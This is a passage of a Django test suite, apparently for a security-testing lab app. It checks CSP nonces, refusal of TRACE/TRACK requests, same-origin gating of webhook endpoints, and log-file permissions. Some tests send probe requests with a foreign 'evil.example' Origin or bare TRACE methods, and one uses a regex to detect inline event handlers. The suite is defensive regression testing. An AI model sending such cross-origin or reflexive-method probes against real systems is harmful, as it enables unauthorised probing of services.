        self.assertTrue(sources, "the page loads no external script at all: the claim needs a fixture")
        for source in sources:
            self.assertTrue(
                source.startswith("/") or source.startswith("'self'"),
                f"{source} is not same-origin, so 'self' does not cover it",
            )

    def test_page_script_carries_the_header_nonce(self) -> None:
        """A nonce the page does not use blocks the page itself."""
        import re

        response = self._page()
        policy = response.headers["Content-Security-Policy"]
        nonce = re.search(r"'nonce-([^']+)'", policy).group(1)
        content = response.content.decode("utf-8")
        self.assertIn(f'<script nonce="{nonce}">', content)

    def test_no_inline_event_handlers_in_served_markup(self) -> None:
        """`onclick=` needs `'unsafe-inline'`, which the policy does not grant.

        Script bodies are stripped first: an `onerror=` inside a JS comment or
        string is inert text, not a handler, and counting it would cry wolf.
        """
        import re

        content = self._page().content.decode("utf-8")
        markup = re.sub(r"<script[\s\S]*?</script>", "", content)
        handlers = re.findall(r'\son(?:click|load|error|submit|change)\s*=', markup)
        self.assertEqual(handlers, [])

    def test_delegated_tab_buttons_still_work(self) -> None:
        """Removing `onclick` must not remove the behaviour: the delegation
        wiring has to exist for every `data-ri-*` hook the markup declares."""
        content = self._page().content.decode("utf-8")
        for hook in ("data-ri-tab=", "data-ri-edit="):
            self.assertIn(hook, content)
        self.assertIn("addEventListener('click'", content)
        self.assertIn("riShowTab(tabButton.dataset.riTab)", content)
        self.assertIn("riEditParam(index)", content)


class ReflexiveMethodTests(TestCase):
    """A02-03 — methods that echo the request back must not be answered.

    Measured on a live stand before the fix: `TRACE /` returned `HTTP 200` with a
    1 111 411-byte body, identical to `GET /`, because Django resolves and calls a
    view without filtering on the method.
    """

    def test_trace_is_refused_with_a_named_reason(self) -> None:
        response = self.client.trace("/")
        self.assertEqual(response.status_code, 405)
        self.assertEqual(response.json()["reason"], "REFLEXIVE_METHOD_REFUSED")
        self.assertEqual(response["Allow"], "GET, HEAD, OPTIONS")

    def test_track_is_refused_too(self) -> None:
        """`TRACK` is the tracking sibling of `TRACE`; allowing one and refusing
        the other would be an arbitrary split."""
        response = self.client.generic("TRACK", "/")
        self.assertEqual(response.status_code, 405)
        self.assertEqual(response.json()["reason"], "REFLEXIVE_METHOD_REFUSED")

    def test_refusal_precedes_routing_not_just_the_view(self) -> None:
        """The middleware has to answer before a view is chosen, otherwise the
        protection depends on every future view declaring its own methods. A path
        that does not exist must still be 405, not 404: 404 would prove the
        resolver ran first and that a catch-all view could have answered."""
        self.assertEqual(self.client.generic("TRACE", "/no-such-path-at-all").status_code, 405)
        self.assertEqual(self.client.get("/no-such-path-at-all").status_code, 404)

    def test_refusal_does_not_depend_on_an_origin_header(self) -> None:
        """A bare `curl -X TRACE` carries no `Origin`, so a gate that judges by
        origin would wave it through. No `Origin`, no cookie, no token: still 405."""
        response = self.client.generic(
            "TRACE", "/", HTTP_ORIGIN="", HTTP_COOKIE="", HTTP_X_CSRFTOKEN=""
        )
        self.assertEqual(response.status_code, 405)

    def test_refusal_precedes_the_origin_gate(self) -> None:
        """Ordering is load-bearing: `TRACE` with a foreign `Origin` must answer
        with the method refusal, not with the origin refusal, so the reason names
        the actual cause."""
        response = self.client.generic("TRACE", "/", HTTP_ORIGIN="https://evil.example")
        self.assertEqual(response.status_code, 405)
        self.assertEqual(response.json()["reason"], "REFLEXIVE_METHOD_REFUSED")

    def test_trace_is_not_classified_as_a_safe_method(self) -> None:
        """The origin gate listed `TRACE` among safe methods. That classification
        is the regression this whole class exists to prevent, so it is asserted on
        the constant rather than only through behaviour."""
        from lab.middleware import SAFE_METHODS

        self.assertNotIn("TRACE", SAFE_METHODS)
        for method in ("TRACE", "TRACK"):
            self.assertNotIn(method, SAFE_METHODS)

    def test_ordinary_methods_still_reach_the_view(self) -> None:
        """A refusal gate that also swallows real traffic is not a fix. GET, HEAD
        and OPTIONS must keep working on the same path."""
        self.assertEqual(self.client.get("/").status_code, 200)
        self.assertEqual(self.client.head("/").status_code, 200)
        self.assertEqual(self.client.options("/").status_code, 200)

    def test_middleware_is_registered_ahead_of_the_origin_gate(self) -> None:
        """`MIDDLEWARE` is an ordered list and Django enters it top-down. If the
        origin gate came first, `TRACE` with a foreign `Origin` would answer with
        the origin reason and the two tests above would silently stop proving
        anything."""
        order = list(settings.MIDDLEWARE)
        self.assertLess(
            order.index("lab.middleware.ReflexiveMethodMiddleware"),
            order.index("lab.middleware.SameOriginMutationMiddleware"),
        )


class WebhookOriginTests(TestCase):
    """A06-02, the part that costs no public contract.

    `api/workflows/hooks/` was exempt from the same-origin gate because a webhook is
    meant to be reached by a third party. A machine-to-machine caller sends no
    `Origin` at all, so it passes the gate without the exemption — the exemption only
    ever decided what happens to a request that *does* carry one, which for a webhook
    means a page in the analyst's browser.

    What that page would reach is the saved graph: the body becomes `input_data`, and
    `{{input.url}}` lets the caller pick the destination of the operator's payload.
    """

    def _hook_path(self) -> str:
        """Create an active workflow with a webhook trigger and return its hook path.

        The slug carries a unique suffix because `webhook_slug` is `unique=True` and
        each test builds its own workflow.
        """
        import uuid

        from lab.models import Workflow

        slug = f"gate-test-{uuid.uuid4().hex[:10]}"
        project = Project.objects.create(name="hook project", target="https://shop.acme.test")
        workflow = Workflow.objects.create(
            project=project,
            name="hooked",
            nodes=[
                {"id": "t", "type": "webhook_trigger", "params": {"method": "POST"}, "position": {"x": 10, "y": 10}},
                {"id": "s", "type": "set", "params": {"values": {"url": "{{input.url}}"}}, "position": {"x": 200, "y": 10}},
            ],
            connections=[{"source": "t", "target": "s"}],
            active=True,
            webhook_slug=slug,
        )
        self.addCleanup(workflow.delete)
        return f"/api/workflows/hooks/{slug}"

    def _post_and_drain(self, path: str, **extra):
        """Post to the hook and wait for the run it starts to finish.

        The endpoint starts a **background** run, and that run keeps its own database
        connection. Returning while it is in flight leaves a session attached to the
        test database, and the runner then fails to drop it —
        `ObjectInUse: database "test_..." is being accessed by other users`, which
        reads like a broken migration and is really an unfinished background job. The
        existing `test_webhook_starts_an_active_workflow` drains the same way.
        """
        import time

        response = self.client.post(path, data="{}", content_type="application/json", **extra)
        if response.status_code != 202:
            return response, None
        run_id = response.json().get("run_id")
        deadline = time.monotonic() + 5
        while run_id and time.monotonic() < deadline:
            run = self.client.get(f"/api/workflows/runs/{run_id}").json()
            if run.get("status") in {"completed", "failed", "cancelled"}:
                break
            time.sleep(0.05)
        return response, run_id

    def test_cross_origin_webhook_call_is_refused(self) -> None:
        response = self.client.post(self._hook_path(), data="{}", content_type="application/json",
                                    HTTP_ORIGIN="https://evil.example")
        self.assertEqual(response.status_code, 403)
        self.assertEqual(response.json()["reason"], "CROSS_ORIGIN_REFUSED")

    def test_same_origin_webhook_call_is_allowed(self) -> None:
        """Removing the exemption must not lock the analyst out of their own hook:
        a test call from the workspace UI is same-origin."""
        response, run_id = self._post_and_drain(self._hook_path(), HTTP_ORIGIN="http://testserver")
        # `!= 403` alone would pass vacuously: a 404 or 400 also is not 403. The run
        # has to actually start, or the test proves nothing about the gate.
        self.assertEqual(response.status_code, 202, f"same-origin call did not run: {response.content[:200]}")
        self.assertTrue(run_id, f"no run was started: {response.content[:200]}")

    def test_browserless_caller_still_works(self) -> None:
        """`curl`, a script and a CI job send no `Origin` — that is the whole point
        of a webhook, and the gate must keep passing it. A refused hook here would be
        a broken feature, not a security win."""
        response, run_id = self._post_and_drain(self._hook_path())
        self.assertEqual(response.status_code, 202, f"origin-less call did not run: {response.content[:200]}")
        self.assertTrue(run_id, f"no run was started: {response.content[:200]}")

    def test_oast_callback_stays_exempt(self) -> None:
        """`api/oast` is machine-to-machine in the other direction: the listener calls
        back. If this lost its exemption the product would stop working, so the
        exemption is asserted rather than assumed."""
        from lab.middleware import ORIGIN_EXEMPT_PREFIXES

        self.assertIn("/api/oast", ORIGIN_EXEMPT_PREFIXES)
        self.assertNotIn("/api/workflows/hooks/", ORIGIN_EXEMPT_PREFIXES)


class WebLogFileTests(SimpleTestCase):
    """A09-01b (HIGH) — the gateway's log went nowhere.

    Measured on a live stack: `data/logs/` held `engine.log`, `browser-worker.log`,
    `redis.log` and `postgres.log`, and **no `web.log`**. Every `lab.*` record and
    every 5xx traceback went to the terminal and was lost when it closed, which made
    the `AGENTS.md` claim that logs live in `data/logs`, one file per process, false
    for the gateway specifically.
    """

    def _settings_logging(self) -> dict:
        from core.settings import LOGGING

        return LOGGING

    def test_lab_logger_writes_to_a_file_and_to_the_console(self) -> None:
        """Both, not either: a file alone would silently remove the live view a
        developer watches during QA, which is a behaviour change nobody asked for."""
        handlers = self._settings_logging()["loggers"]["lab"]["handlers"]
        self.assertIn("web_file", handlers)
        self.assertIn("console", handlers)

    def test_django_request_errors_reach_the_same_file(self) -> None:
        """4xx/5xx responses were console-only for the same reason `lab.*` was."""
        request_logger = self._settings_logging()["loggers"]["django.request"]
        self.assertIn("web_file", request_logger["handlers"])
        # `dictConfig` keeps the level as the string written in settings, so the
        # comparison has to go through the logging module that will interpret it.
        # Comparing the string against `logging.WARNING` raised TypeError here —
        # the assertion has to be on the meaning, not on the literal.
        self.assertEqual(
            logging.getLevelName(request_logger["level"]), logging.WARNING
        )

    def test_the_handler_rotates_and_appends(self) -> None:
        """Rotation is what makes the file readable a month later, and append is what
        keeps a restart from erasing the record of the run before it."""
        handler = self._settings_logging()["handlers"]["web_file"]
        self.assertEqual(handler["mode"], "a")
        self.assertGreater(handler["maxBytes"], 0)
        self.assertGreater(handler["backupCount"], 0)
        self.assertEqual(
            handler["class"], "core.settings._RestrictedRotatingFileHandler",
            "the handler must be the one that narrows the file mode",
        )

    def _configured_handler_class(self):
        """The handler class the application actually uses, resolved from LOGGING.

        The permission tests must go through this. Importing
        `_RestrictedRotatingFileHandler` by name directly left them passing even when
        the configuration pointed at the plain base class — the mutation proved it:
        reverting the `class` key failed only the assertion on the class name, while
        both mode tests stayed green testing code nothing ran.
        """
        from django.utils.module_loading import import_string

        return import_string(self._settings_logging()["handlers"]["web_file"]["class"])

    def test_the_file_is_created_with_a_narrow_mode(self) -> None:
        """`0600`. Asserted on a real handler writing a real record, because a chmod
        at import has nothing to act on while `delay: True` keeps the file uncreated —
        the measured result of that approach was the umask default `-rw-rw-r--`."""
        import logging as logging_module

        handler_class = self._configured_handler_class()

        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory) / "web.log"
            handler = handler_class(
                str(target), maxBytes=64, backupCount=2, delay=True, encoding="utf-8"
            )
            try:
                handler.emit(
                    logging_module.LogRecord("lab", logging_module.INFO, __file__, 1, "probe", None, None)
                )
            finally:
                handler.close()

            self.assertTrue(target.exists(), "the first record must create the file")
            mode = stat.S_IMODE(target.stat().st_mode)
            self.assertEqual(oct(mode), oct(0o600), f"log file mode is {oct(mode)}, not 0600")

    def test_the_mode_survives_rotation(self) -> None:
        """A log rotated away and recreated comes back at the umask mode, so the
        permission would silently regress on every rotation unless the handler
        re-applies it each time it opens."""
        import logging as logging_module

        handler_class = self._configured_handler_class()

        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory) / "web.log"
            handler = handler_class(
                str(target), maxBytes=64, backupCount=1, delay=False, encoding="utf-8"
            )
            try:
                for index in range(200):
                    handler.emit(
                        logging_module.LogRecord(
                            "lab", logging_module.INFO, __file__, 1,
                            f"padding to force rotation {index} " + "x" * 40, None, None,
                        )
                    )
                rotated = sorted(p.name for p in Path(directory).iterdir())
                self.assertGreater(len(rotated), 1, f"no rotation happened: {rotated}")
                for name in rotated:
                    mode = stat.S_IMODE((Path(directory) / name).stat().st_mode)
                    self.assertEqual(oct(mode), oct(0o600), f"{name} is {oct(mode)}, not 0600")
            finally:
                handler.close()

    def test_the_log_directory_is_created_not_assumed(self) -> None:
        """`delay: True` means the directory has to exist before the first record, or
        logging raises inside the request that happened to log something."""
        from core.settings import _RR_LOG_DIR

        self.assertTrue(_RR_LOG_DIR.is_dir(), f"{_RR_LOG_DIR} does not exist")

    def test_the_log_file_lives_beside_the_other_services(self) -> None:
        """One file per process in `data/logs`, which is where `start.sh` puts them.
        A second directory would mean a human looking in the documented place finds
        nothing."""
        from core.settings import _RR_LOG_DIR, _RR_WEB_LOG

        self.assertEqual(_RR_WEB_LOG.parent, _RR_LOG_DIR)
        self.assertEqual(_RR_WEB_LOG.name, "web.log")
